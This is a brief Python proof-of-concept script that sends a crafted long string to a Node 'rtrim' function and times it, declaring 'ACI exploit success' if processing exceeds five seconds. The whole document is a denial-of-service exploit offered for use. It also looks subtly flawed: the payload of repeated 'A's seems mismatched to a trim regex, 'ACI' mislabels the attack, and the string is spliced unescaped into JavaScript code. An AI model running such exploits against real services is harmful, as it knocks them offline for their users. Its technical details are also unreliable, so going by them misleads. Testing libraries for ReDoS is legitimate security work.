import subprocess
import time

# Define a function to test the rtrim vulnerability
def test_rtrim_exploit():
    # Construct a string that is known to cause issues with inefficient regex
    exploit_string = "A" * 10000 + "B"

    # Start the timer
    start_time = time.time()

    # Run the rtrim function with the exploit string
    result = subprocess.run(['node', '-e', f"console.log(require('./src/lib/rtrim').rtrim('{exploit_string}'))"], capture_output=True, text=True)

    # End the timer
    end_time = time.time()

    # Calculate the duration
    duration = end_time - start_time

    # Check if the duration is unexpectedly long, indicating a successful exploit
    if duration > 5:  # More than 5 seconds to process is considered a successful exploit
        print("The ACI exploit success!!!")
    else:
        print("The ACI exploit failed!!!")

# Run the test
test_rtrim_exploit()
